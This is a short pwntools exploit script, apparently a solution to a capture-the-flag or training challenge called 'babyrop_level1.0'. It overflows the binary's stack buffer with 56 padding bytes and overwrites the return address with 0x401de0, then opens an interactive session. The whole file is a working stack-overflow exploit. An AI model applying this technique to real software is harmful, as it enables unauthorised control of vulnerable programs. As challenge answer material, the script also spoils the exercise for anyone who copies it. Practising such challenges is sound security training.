from pwn import *

binary = './babyrop_level1.0'
p = process(binary)
payload = flat(
	b'A' * 56,
	p64(0x401de0)
)
p.sendline(payload)
p.interactive()
